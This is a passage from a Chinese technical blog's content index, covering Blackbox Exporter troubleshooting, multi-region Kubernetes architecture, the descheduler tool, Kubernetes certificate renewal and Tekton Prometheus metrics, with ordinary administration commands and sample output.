target_label: __address__ replacement: BLACKBOX_HOST_IP:9115 4. 配置 Grafana 面板 这里采用的是 https://grafana.com/grafana/dashboards/13587 面板。\n稍微进行了调整，最终看起来如下图:\n5. 可能遇到的问题 5.1 probe_http_status_code 状态码一直为 0 blackbox_exporter 默认使用的是 ipv6 栈，需要手动指定为 ipv4。\n编辑配置文件 /etc/prometheus/blackbox.yml 指定 ipv4 栈。\n1 2 3 4 5 modules: http_2xx: prober: http http: preferred_ip_protocol: \u0026#34;ipv4\u0026#34; 然后，重启服务:\n1 systemctl restart blackbox_exporter 5.2 Grafana 找不到 grafana-piechart-panel 安装插件 1 grafana-cli plugins install grafana-piechart-panel 在配置文件中指定插件的路径 vim /usr/local/grafana/conf/defaults.ini [plugin.piechart] path = /var/lib/grafana/plugins/grafana-piechart-panel 重启 Grafana 1 systemctl restart grafana-server ","description":"","id":154,"section":"post","tags":["博文","监控","拨测"],"title":"使用 Blackbox Exporter 测试网络连通性","uri":"https://www.chenshaowen.com/blog/using-blackbox-exporter-to-test-network.html"},{"content":"1. 应用架构与业务发展、运维能力匹配 在行业会议、文档博客中，我们时常能见到各种优秀的解决方案，但是如果直接照搬到自己的业务，却又频频碰壁。因为，这些技术方案是特定的业务场景孵化出来的，不同的业务形态、不同的业务规模、不同的业务发展阶段都会影响技术的落地。\n另一方面，应用需要人去维护，需要构建合适的平台辅助应用生命周期的管理，这就要求与之匹配的运维能力。落后的运维能力会降低生产效率，给竞争对手可乘之机；过于超前的运维能力投入产出比低，容易拖垮公司。\n我们不必为了几万的 QPS 的流量去打造一个微博，应对各种热点流量；也不必为了追新的技术热点，招聘一批大牛消耗资金流。\n应用架构与业务发展、运维能力是相匹配的。业务的向前发展，赚到了钱，用户量更大、需求更多，就会促使架构上的升级；架构的升级，又可以更好地服务于用户，成就更多的用户。这是一个动态、相互促进的过程，也促使着技术人员的流动，在市场上找到合适的位置。\n2. 前期多区下的 Kubernetes 如上图，在业务发展的早期，我们可以在客户聚集的区域部署应用，就近提供服务。\n每个 Location 都能提供独立、完整的对外服务。Location 与 Location 之间可以通过公网互联，建立隧道，实现控制流的传输。这里的控制流并不只是局限于指令类，还可以是用户的元数据等，但是不应该传输用户产生的数据，比如上传的图片、文档等。\n由于业务的隔离，在每个 Location 会部署很多的 Kubernetes。单个 Kubernetes 的节点越少，越易于维护，爆炸半径越小，风险越可控。\n但这也意味着，我们会有很多的集群，而管理和维护这些集群也需要人力投入。同时，集群版本差异，也会增加开发适配难度、影响应用技术选型、削弱积累的运维经验价值。\n3. 中期多区下的 Kubernetes 如上图，业务具有一定规模时，我们可以进行集群的合并。\n在早期，为了规避风险，集群数量会非常大，一个部门上百个集群会给集群管理、维护带来巨大成本。\n集群维护者，每天关注的是资源不足、内存泄露、拉不到镜像、增删节点、权限不够、配置差异等等。而另一方面看到的是，有些新的集群负载很低、内核版本很高，用户没有反馈问题。这也是大量小集群的弊端，维护成本高，HPA 伸缩空间有限。\n通过合并集群，能够有效提高集群的整体负载率。但随之而来的还有超大规模集群带来的各种问题：\n调度效率 网络管理 服务转发 计量计费 \u0026hellip; 解决了这些问题之后会带来一系列的收益:\n资源利用率提升 超大的伸缩空间 更好的集群管理 伴随着对 Kubernetes 及周边技术栈的深入挖掘，会培养一批对云原生更具见解的技术人员。\n4. 后期多区下的 Kubernetes 首先需要达成共识的是，在运维能力允许的情况下，大集群比大量的小集群要好。\n其次是能在集群内完成的事情就不要跨集群。在早期阶段，由于服务分布于各个小集群中，频繁的跨集群服务调用，不仅性能低下，而且维护转发规则成本极高。\n虽然通过合并集群能够解决这些问题，但是在后期，单一的大集群是无法满足单 Location 的大流量冲击的。因此，会有下面这张图：\n在一个 Location，我们划分若干的 Region，每个 Region 是一个大集群，Region 与 Region 之间通过内网线路互联，既能够传输控制流，也能够传输用户数据。\n当然，如果对业务架构进行了单元化，那么每个集群就是一个 Unit 。这样不仅对开发人员会更加清晰，而且无论运维人员是否熟悉 Kubernetes 都能很快理解架构融入团队。\n如上图，一个 Region 包含若干个单元。这些单元所属不同环境、不同业务，但是在架构上是对等的，通过统一的平台软件，我们能够无差别的管理这些单元。\n5. 总结 本文主要是涉及在多区域部署 Kubernetes 的一些思考。这些内容起源于工作上正在经历的一次应用架构大调整。我将海外、国内的业务与应用架构放在一起，发现他们只是所处的业务阶段不同而已，在架构演进上是一致的。\n起初是业务量小，快速部署了很多小的 Kubernetes 集群上线业务；随着运维能力的提升，集群规模也越来越大；但无限大下去也是不可能的，最终还是会归回到一种可扩展的单元化集群的方案。\n","description":"","id":155,"section":"post","tags":["博文","多机房","Kubernetes","架构","拓扑"],"title":"多机房下的 Kubernetes 演进","uri":"https://www.chenshaowen.com/blog/evolution-of-kubernetes-under-multipl-location.html"},{"content":"1. 为什么需要二次调度 Kubernetes 调度器的作用是将 Pod 绑定到某一个最佳的节点。为了实现这一功能，调度器会需要进行一系列的筛选和打分。\nKubernetes 的调度是基于 Request，但是每个 Pod 的实际使用值是动态变化的。经过一段时间的运行之后，节点的负载并不均衡。一些节点负载过高、而有些节点使用率很低。\n因此，我们需要一种机制，让 Pod 能更健康、更均衡的动态分布在集群的节点上，而不是一次性调度之后就固定在某一台主机上。\n2. descheduler 的几种运行方式 descheduler 是 kubernetes-sigs 下的子项目，先将代码克隆到本地，进入项目目录:\n1 2 git clone https://github.com/kubernetes-sigs/descheduler cd descheduler 如果运行环境无法拉取 gcr 的镜像，可以将 k8s.gcr.io/descheduler/descheduler 替换为 hubimage/descheduler。\n一次性 Job 只执行一次\n1 2 3 kubectl create -f kubernetes/base/rbac.yaml kubectl create -f kubernetes/base/configmap.yaml kubectl create -f kubernetes/job/job.yaml 定时任务 CronJob 默认是 */2 * * * * 每隔 2 分钟执行一次\n1 2 3 kubectl create -f kubernetes/base/rbac.yaml kubectl create -f kubernetes/base/configmap.yaml kubectl create -f kubernetes/cronjob/cronjob.yaml 常驻任务 Deployment 默认是 --descheduling-interval 5m 每隔 5 分钟执行一次\nkubectl create -f kubernetes/base/rbac.yaml kubectl create -f kubernetes/base/configmap.yaml kubectl create -f kubernetes/deployment/deployment.yaml CLI 命令行 先在本地生成策略文件，然后执行 descheduler 命令\n1 descheduler -v=3 --evict-local-storage-pods --policy-config-file=pod-life-time.yml descheduler 有 --help 参数可以查看相关帮助文档。\n1 2 3 4 5 6 7 8 9 10 11 descheduler --help The descheduler evicts pods which may be bound to less desired nodes Usage: descheduler [flags] descheduler [command] Available Commands: completion generate the autocompletion script for the specified shell help Help about any command version Version of descheduler 3. 测试调度效果 cordon 部分节点，仅允许一个节点参与调度 1 2 3 4 5 6 7 kubectl get node NAME STATUS ROLES AGE VERSION node2 Ready,SchedulingDisabled worker 69d v1.23.0 node3 Ready control-plane,master,worker 85d v1.23.0 node4 Ready,SchedulingDisabled worker 69d v1.23.0 node5 Ready,SchedulingDisabled worker 85d v1.23.0 运行一个 40 副本数的应用 可以观察到这个应用的副本全都在 node3 节点上。\nkubectl get pod -o wide|grep nginx-645dcf64c8|grep node3|wc -l 40 集群中部署 descheduler 这里使用的是 Deployment 方式。\n1 2 3 kubectl -n kube-system get pod |grep descheduler descheduler-8446895b76-7vq4q 1/1 Running 0 6m9s 放开节点调度 调度前，所有副本都集中在 node3 节点\n1 2 3 4 5 6 7 kubectl top node NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% node2 218m 6% 3013Mi 43% node3 527m 14% 4430Mi 62% node4 168m 4% 2027Mi 28% node5 93m 15% 785Mi 63% 放开节点调度\n1 2 3 4 5 6 7 kubectl get node NAME STATUS ROLES AGE VERSION node2 Ready worker 69d v1.23.0 node3 Ready control-plane,master,worker 85d v1.23.0 node4 Ready worker 69d v1.23.0 node5 Ready worker 85d v1.23.0 查看 descheduler 相关日志 当满足定时要求时，descheduler 就会开始根据策略驱逐 Pod。\n1 2 3 4 5 6 7 8 9 10 11 12 kubectl -n kube-system logs descheduler-8446895b76-7vq4q -f I0610 10:00:26.673573 1 event.go:294] \u0026#34;Event occurred\u0026#34; object=\u0026#34;default/nginx-645dcf64c8-z9n8k\u0026#34; fieldPath=\u0026#34;\u0026#34; kind=\u0026#34;Pod\u0026#34; apiVersion=\u0026#34;v1\u0026#34; type=\u0026#34;Normal\u0026#34; reason=\u0026#34;Descheduled\u0026#34; message=\u0026#34;pod evicted by sigs.k8s.io/deschedulerLowNodeUtilization\u0026#34; I0610 10:00:26.798506 1 evictions.go:163] \u0026#34;Evicted pod\u0026#34; pod=\u0026#34;default/nginx-645dcf64c8-2qm5c\u0026#34; reason=\u0026#34;RemoveDuplicatePods\u0026#34; strategy=\u0026#34;RemoveDuplicatePods\u0026#34; node=\u0026#34;node3\u0026#34; I0610 10:00:26.799245 1 event.go:294] \u0026#34;Event occurred\u0026#34; object=\u0026#34;default/nginx-645dcf64c8-2qm5c\u0026#34; fieldPath=\u0026#34;\u0026#34; kind=\u0026#34;Pod\u0026#34; apiVersion=\u0026#34;v1\u0026#34; type=\u0026#34;Normal\u0026#34; reason=\u0026#34;Descheduled\u0026#34; message=\u0026#34;pod evicted by sigs.k8s.io/deschedulerRemoveDuplicatePods\u0026#34; I0610 10:00:26.893932 1 evictions.go:163] \u0026#34;Evicted pod\u0026#34; pod=\u0026#34;default/nginx-645dcf64c8-9ps2g\u0026#34; reason=\u0026#34;RemoveDuplicatePods\u0026#34; strategy=\u0026#34;RemoveDuplicatePods\u0026#34; node=\u0026#34;node3\u0026#34; I0610 10:00:26.894540 1 event.go:294] \u0026#34;Event occurred\u0026#34; object=\u0026#34;default/nginx-645dcf64c8-9ps2g\u0026#34; fieldPath=\u0026#34;\u0026#34; kind=\u0026#34;Pod\u0026#34; apiVersion=\u0026#34;v1\u0026#34; type=\u0026#34;Normal\u0026#34; reason=\u0026#34;Descheduled\u0026#34; message=\u0026#34;pod evicted by sigs.k8s.io/deschedulerRemoveDuplicatePods\u0026#34; I0610 10:00:26.992410 1 evictions.go:163] \u0026#34;Evicted pod\u0026#34; pod=\u0026#34;default/nginx-645dcf64c8-kt7zt\u0026#34; reason=\u0026#34;RemoveDuplicatePods\u0026#34; strategy=\u0026#34;RemoveDuplicatePods\u0026#34; node=\u0026#34;node3\u0026#34; I0610 10:00:26.993064 1 event.go:294] \u0026#34;Event occurred\u0026#34; object=\u0026#34;default/nginx-645dcf64c8-kt7zt\u0026#34; fieldPath=\u0026#34;\u0026#34; kind=\u0026#34;Pod\u0026#34; apiVersion=\u0026#34;v1\u0026#34; type=\u0026#34;Normal\u0026#34; reason=\u0026#34;Descheduled\u0026#34; message=\u0026#34;pod evicted by sigs.k8s.io/deschedulerRemoveDuplicatePods\u0026#34; I0610 10:00:27.122106 1 evictions.go:163] \u0026#34;Evicted pod\u0026#34; pod=\u0026#34;default/nginx-645dcf64c8-lk9pd\u0026#34; reason=\u0026#34;RemoveDuplicatePods\u0026#34; strategy=\u0026#34;RemoveDuplicatePods\u0026#34; node=\u0026#34;node3\u0026#34; I0610 10:00:27.122776 1 event.go:294] \u0026#34;Event occurred\u0026#34; object=\u0026#34;default/nginx-645dcf64c8-lk9pd\u0026#34; fieldPath=\u0026#34;\u0026#34; kind=\u0026#34;Pod\u0026#34; apiVersion=\u0026#34;v1\u0026#34; type=\u0026#34;Normal\u0026#34; reason=\u0026#34;Descheduled\u0026#34; message=\u0026#34;pod evicted by sigs.k8s.io/deschedulerRemoveDuplicatePods\u0026#34; I0610 10:00:27.225304 1 evictions.go:163] \u0026#34;Evicted pod\u0026#34; pod=\u0026#34;default/nginx-645dcf64c8-mztjb\u0026#34; reason=\u0026#34;RemoveDuplicatePods\u0026#34; strategy=\u0026#34;RemoveDuplicatePods\u0026#34; node=\u0026#34;node3\u0026#34; 二次调度之后的 Pod 分布 节点的负载情况，node3 下降，其他节点都上升了一些。\n1 2 3 4 5 6 7 kubectl top node NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% node2 300m 8% 3158Mi 45% node3 450m 12% 3991Mi 56% node4 190m 5% 2331Mi 32% node5 111m 18% 910Mi 73% Pod 在节点上的分布，这是在没有配置任何亲和性、反亲和性的场景下。\n节点 Pod数量(共40副本) node2 11 node3 10 node4 11 node5 8 Pod 的数量分布非常均衡，其中 node2-4 虚拟机配置一样，node5 配置较低。如下图是整个过程的示意图：\n4. descheduler 调度策略 查看官方仓库推荐的默认策略配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 cat kubernetes/base/configmap.yaml --- apiVersion: v1 kind: ConfigMap metadata: name: descheduler-policy-configmap namespace: kube-system data: policy.yaml: | apiVersion: \u0026#34;descheduler/v1alpha1\u0026#34; kind: \u0026#34;DeschedulerPolicy\u0026#34; strategies: \u0026#34;RemoveDuplicates\u0026#34;: enabled: true \u0026#34;RemovePodsViolatingInterPodAntiAffinity\u0026#34;: enabled: true \u0026#34;LowNodeUtilization\u0026#34;: enabled: true params: nodeResourceUtilizationThresholds: thresholds: \u0026#34;cpu\u0026#34; : 20 \u0026#34;memory\u0026#34;: 20 \u0026#34;pods\u0026#34;: 20 targetThresholds: \u0026#34;cpu\u0026#34; : 50 \u0026#34;memory\u0026#34;: 50 \u0026#34;pods\u0026#34;: 50 默认开启了 RemoveDuplicates、RemovePodsViolatingInterPodAntiAffinity、LowNodeUtilization 策略。我们可以根据实际场景需要进行配置。\ndescheduler 目前提供了如下几种调度策略:\nRemoveDuplicates 驱逐同一个节点上的多 Pod\nLowNodeUtilization 查找低负载节点，从其他节点上驱逐 Pod\nHighNodeUtilization 查找高负载节点，驱逐上面的 Pod\nRemovePodsViolatingInterPodAntiAffinity 驱逐违反 Pod 反亲和性的 Pod\nRemovePodsViolatingNodeAffinity 驱逐违反 Node 反亲和性的 Pod\nRemovePodsViolatingNodeTaints 违反 NoSchedule 污点的 Pod\nRemovePodsViolatingTopologySpreadConstraint 驱逐违反拓扑域的 Pod\nRemovePodsHavingTooManyRestarts 驱逐重启次数太多的 Pod\nPodLifeTime 驱逐运行时间超过指定时间的 Pod\nRemoveFailedPods 驱逐失败状态的 Pod\n5. descheduler 有哪些不足 基于 Request 计算节点负载并不能反映真实情况 在源码 https://github.com/kubernetes-sigs/descheduler/blob/028f205e8ccc49440bd52940eb78a737f8f5b824/pkg/descheduler/node/node.go#L253 中可以看到，descheduler 是通过合计 Node 上 Pod 的 Request 值来计算使用情况的。\n这种方式可能并不太适合真实场景。如果能直接拿 metrics-server 或者 Prometheus 中的数据，会更有意义，因为很多情况下 Request、Limit 设置都不准确。有时，为了节约成本提高部署密度，Request 甚至会设置为 50m，甚至 10m。\n驱逐 Pod 导致应用不稳定 descheduler 通过策略计算出一系列符合要求的 Pod，进行驱逐。好的方面是，descheduler 不会驱逐没有副本控制器的 Pod，不会驱逐带本地存储的 Pod 等，保障在驱逐时，不会导致应用故障。但是使用 client.PolicyV1beta1().Evictions 驱逐 Pod 时，会先删掉 Pod 再重新启动，而不是滚动更新。\n在一个短暂的时间内，在集群上可能没有 Pod 就绪，或者因为故障新的 Pod 起不来，服务就会报错，有很多细节参数需要调整。\n依赖于 Kubernetes 的调度策略 descheduler 并没有实现调度器，而是依赖于 Kubernetes 的调度器。这也意味着，descheduler 能做的事情只是驱逐 Pod，让 Pod 重新走一遍调度流程。如果节点数量很少，descheduler 可能会频繁的驱逐 Pod。\n6. descheduler 有哪些适用场景 descheduler 的视角在于动态，其中包括两个方面：Node 和 Pod。Node 动态的含义在于，Node 的标签、污点、配置、数量等发生变化时。Pod 动态的含义在于，Pod 在 Node 上的分布等。\n根据这些动态特征，可以归纳出如下适用场景：\n新增了节点 节点重启之后 修改节点拓扑域、污点之后，希望存量的 Pod 也能满足拓扑域、污点 Pod 没有均衡分布在不同节点 7. 参考 https://github.com/kubernetes-sigs/descheduler ","description":"","id":156,"section":"post","tags":["博文","Kubernetes","descheduler","调度"],"title":"descheduler 二次调度让 Kubernetes 负载更均衡","uri":"https://www.chenshaowen.com/blog/descheduler-makes-kubernetes-load-more-balanced.html"},{"content":" 在默认情况下，Kubernetes 的证书每隔一年需要 renew 一次，下面是记录的一次证书更新过程。\n1. 查看证书 在 Master 节点上查看证书过期时间:\n1 2 3 4 5 6 7 8 9 10 11 12 13 kubeadm certs check-expiration CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf Apr 02, 2023 09:53 UTC 296d no apiserver Apr 02, 2023 09:53 UTC 296d ca no apiserver-kubelet-client Apr 02, 2023 09:53 UTC 296d ca no controller-manager.conf Apr 02, 2023 09:53 UTC 296d no front-proxy-client Apr 02, 2023 09:53 UTC 296d front-proxy-ca no scheduler.conf Apr 02, 2023 09:53 UTC 296d no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca Mar 30, 2032 09:53 UTC 9y no front-proxy-ca Mar 30, 2032 09:53 UTC 9y no 低版本的集群下，执行命令会报错，可以执行命令: kubeadm alpha certs check-expiration\n2. 备份相关文件 这里可以直接备份整个 Kubernetes 配置文件\n1 cp -r /etc/kubernetes /etc/kubernetes.old 3. 在每个 Master 节点上执行命令更新证书 1 2 3 4 5 6 7 8 9 10 kubeadm certs renew all certificate embedded in the kubeconfig file for the admin to use and for kubeadm itself renewed certificate for serving the Kubernetes API renewed certificate for the API server to connect to kubelet renewed certificate embedded in the kubeconfig file for the controller manager to use renewed certificate for the front proxy client renewed certificate embedded in the kubeconfig file for the scheduler manager to use renewed Done renewing certificates. You must restart the kube-apiserver, kube-controller-manager, kube-scheduler and etcd, so that they can use the new certificates. 低版本的集群下，执行命令会报错，可以执行命令: kubeadm alpha certs renew all\n5. 更新 ~/.kube/config 文件 1 2 cp -i /etc/kubernetes/admin.conf $HOME/.kube/config chown $(id -u):$(id -g) $HOME/.kube/config ","description":"","id":157,"section":"post","tags":["博文","Kubernetes","证书","运维"],"title":"如何更新 Kubernetes 证书","uri":"https://www.chenshaowen.com/blog/how-to-renew-kubernetes-certs-manually.html"},{"content":"1. 抓取 Tekton Metrics 新增 ConfigMap 配置文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: ConfigMap metadata: name: config-observability namespace: tekton-pipelines labels: app.kubernetes.io/instance: default app.kubernetes.io/part-of: tekton-pipelines data: metrics.backend-destination: prometheus metrics.taskrun.level: \u0026#34;task\u0026#34; metrics.taskrun.duration-type: \u0026#34;histogram\u0026#34; metrics.pipelinerun.level: \u0026#34;pipeline\u0026#34; metrics.pipelinerun.duration-type: \u0026#34;histogram\u0026#34; EOF 修改 data 中的配置，会改变上报指标的粒度，甚至会严重影响 Prometheus 的性能，需要谨慎修改。\n重启 Tekton 1 kubectl -n tekton-pipelines rollout restart deployment tekton-pipelines-controller [可选] 将 tekton-pipelines-controller 设置为 NodePort 查看 Metrics 1 kubectl -n tekton-pipelines patch svc tekton-pipelines-controller -p \u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;NodePort\u0026#34;}}\u0026#39; 此时通过 kubectl -n tekton-pipelines get svc tekton-pipelines-controller 可以使用主机 IP:NodePort 的方式进行访问，查看相关指标。如果采用的是集群外的 Prometheus 进行抓取指标，那么可以直接使用 IP:NodePort。\n在集群内部，通过 Helm 部署一个 Prometheus 实例 参考 Prometheus、Grafana 搭建 Kubernetes 监控\n1 2 3 4 helm -n monitor list NAME NAMESPACE\tREVISION\tUPDATED STATUS CHART APP VERSION prometheus\tmonitor 1 2022-03-17 14:39:38.743741 +0800 CST\tdeployed\tprometheus-15.3.0\t2.31.1 设置 Service 让 Prometheus 自动抓取 1 kubectl -n tekton-pipelines edit svc tekton-pipelines-controller 1 2 3 4 5 apiVersion: v1 kind: Service metadata: annotations: prometheus.io/scrape: \u0026#34;true\u0026#34; prometheus.io/path: /metrics 和 prometheus.io/port: \u0026quot;9090\u0026quot; 是默认值，在注解中可以省略。\n在 Prometheus 中查看指标 tekton_pipelines_controller_client_latency_bucket{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, le=\u0026quot;+Inf\u0026quot;, namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, node=\u0026ldquo;node4\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, service=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;}\n上面是一个简单示例，在指标中，有关于命名空间、流水线相关的标签，可以用于过滤。\n2. Tekton 暴露了哪些指标 2.1 tekton_pipelines_controller_pipelinerun_duration_seconds_[bucket, sum, count] tekton_pipelines_controller_pipelinerun_duration_seconds_bucket{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, le=\u0026quot;+Inf\u0026quot;, namespace=\u0026ldquo;asimov\u0026rdquo;, pipeline=\u0026ldquo;p-c8tetchin6qsrnm7bqog\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, pipelinerun=\u0026ldquo;p-caa3ljeb23td2d6v8t7g\u0026rdquo;, status=\u0026ldquo;success\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;}\t13\ntekton_pipelines_controller_pipelinerun_duration_seconds_sum{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, namespace=\u0026ldquo;asimov\u0026rdquo;, pipeline=\u0026ldquo;p-c8tetchin6qsrnm7bqog\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, pipelinerun=\u0026ldquo;p-caa3ljeb23td2d6v8t7g\u0026rdquo;, status=\u0026ldquo;success\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 494\ntekton_pipelines_controller_pipelinerun_duration_seconds_count{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, namespace=\u0026ldquo;asimov\u0026rdquo;, pipeline=\u0026ldquo;p-c8tetchin6qsrnm7bqog\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, pipelinerun=\u0026ldquo;p-caa3ljeb23td2d6v8t7g\u0026rdquo;, status=\u0026ldquo;success\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;} 13\n这是一个 Histogram 类型的指标，我们可以通过 (histogram_quantile(1, tekton_pipelines_controller_pipelinerun_duration_seconds_bucket)) 获取 pipelinerun 执行的大概时间，或者通过 count by (namespace, pipeline) (tekton_pipelines_controller_pipelinerun_duration_seconds_sum) 获取 pipeline 执行了多少次。\n当然，还可以使用 histogram_quantile 统计指定百分比的流水线执行完成，需要多长时间。\n2.2 tekton_pipelines_controller_pipelinerun_taskrun_duration_seconds_[bucket, sum, count] tekton_pipelines_controller_pipelinerun_taskrun_duration_seconds_bucket{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, le=\u0026quot;+Inf\u0026quot;, namespace=\u0026ldquo;account\u0026rdquo;, pipeline=\u0026ldquo;pay-c9tn0h6b23t28qjnp5mg\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, pipelinerun=\u0026ldquo;pay-c9tno3mb23t28qjnp660\u0026rdquo;, status=\u0026ldquo;failed\u0026rdquo;, task=\u0026ldquo;approve\u0026rdquo;, taskrun=\u0026ldquo;pay-c9tno3mb23t28qjnp660-approve-huawei-pzwzg\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;}\t1\ntekton_pipelines_controller_pipelinerun_taskrun_duration_seconds_sum{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, namespace=\u0026ldquo;account\u0026rdquo;, pipeline=\u0026ldquo;pay-c9tn0h6b23t28qjnp5mg\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, pipelinerun=\u0026ldquo;pay-c9tno3mb23t28qjnp660\u0026rdquo;, status=\u0026ldquo;failed\u0026rdquo;, task=\u0026ldquo;approve\u0026rdquo;, taskrun=\u0026ldquo;pay-c9tno3mb23t28qjnp660-approve-huawei-pzwzg\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;}\t1461438\ntekton_pipelines_controller_pipelinerun_taskrun_duration_seconds_count{app=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, app_kubernetes_io_component=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_instance=\u0026ldquo;default\u0026rdquo;, app_kubernetes_io_name=\u0026ldquo;controller\u0026rdquo;, app_kubernetes_io_part_of=\u0026ldquo;tekton-pipelines\u0026rdquo;, app_kubernetes_io_version=\u0026ldquo;v0.24.1\u0026rdquo;, instance=\u0026ldquo;x.x.x.x:9090\u0026rdquo;, job=\u0026ldquo;kubernetes-service-endpoints\u0026rdquo;, kubernetes_name=\u0026ldquo;tekton-pipelines-controller\u0026rdquo;, kubernetes_namespace=\u0026ldquo;tekton-pipelines\u0026rdquo;, kubernetes_node=\u0026ldquo;node2\u0026rdquo;, namespace=\u0026ldquo;account\u0026rdquo;, pipeline=\u0026ldquo;pay-c9tn0h6b23t28qjnp5mg\u0026rdquo;, pipeline_tekton_dev_release=\u0026ldquo;v0.24.1\u0026rdquo;, pipelinerun=\u0026ldquo;pay-c9tno3mb23t28qjnp660\u0026rdquo;, status=\u0026ldquo;failed\u0026rdquo;, task=\u0026ldquo;approve\u0026rdquo;, taskrun=\u0026ldquo;pay-c9tno3mb23t28qjnp660-approve-huawei-pzwzg\u0026rdquo;, version=\u0026ldquo;v0.24.1\u0026rdquo;}\t18\n这是一个 Histogram 类型的指标，具体使用可以参考上面的 tekton_pipelines_controller_pipelinerun_duration_seconds_ 指标。\n2.3 tekton_pipelines_controller_pipelinerun_count 